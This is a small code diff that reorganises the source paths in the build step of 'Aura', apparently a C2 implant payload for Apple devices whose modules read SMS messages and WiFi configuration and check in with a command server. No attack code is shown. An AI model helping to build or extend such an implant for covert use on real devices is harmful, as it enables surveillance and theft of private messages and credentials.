@@ -213,12 +213,12 @@ class Aura(PayloadType):
         # Our source files to compile
         source_files = [
             "main.m",
-            "C2CheckIn.m",
+            "c2/C2CheckIn.m",
             "c2_profiles/HTTPC2Config.m",
-            "SystemInfoHelper.m",
-            "C2Task.m",
-            "SMSReader.m",
-            "WiFiConfigReader.m"
+            "system_info/SystemInfoHelper.m",
+            "c2/C2Task.m",
+            "moduels/sms/SMSReader.m",
+            "modules/wifi/WiFiConfigReader.m"
         ]
 
         source_file_paths = " ".join([f"{self.agent_code_path}/{src}" for src in source_files])
